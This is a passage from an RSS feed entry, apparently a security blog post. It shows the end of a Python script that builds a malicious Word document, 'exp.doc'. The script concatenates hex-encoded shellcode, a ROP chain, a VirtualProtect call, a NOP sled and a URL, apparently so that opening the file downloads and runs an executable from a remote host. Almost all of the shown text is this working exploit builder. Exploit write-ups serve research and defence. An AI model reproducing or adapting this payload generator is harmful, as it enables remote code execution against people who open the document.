&quot;\x66\x33\x33\x63\x39\x35\x31\x35\x31\x38\x62\x66\x35\x35\x36\x35\x37\x35\x31\x66\x66\x64\x30\x36\x38\x39\x38\x66\x65\x38\x61\x30\x65\x35\x33\x65\x38\x33\x30&quot;
&quot;\x66\x66\x66\x66\x66\x66\x34\x31\x35\x31\x35\x36\x66\x66\x64\x30&quot;
)
URL = &quot;http://AL/calc.exe&quot;
URL1 = binascii.b2a_hex(URL)
URL2 = &quot;00&quot;
shell = shell1 + URL1 + URL2

shellcode = header + control + rop + VP + rop1 + rop2 + nops +shell + footer

file = open(&quot;exp.doc&quot;,&quot;wb&quot;)
file.write(shellcode)
file.close()</pre>
</div></blockquote>

]]></content:encoded>
			<dc:creator>w@rri0r@bh@y</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=1623</guid>
		</item>
	</channel>
</rss>
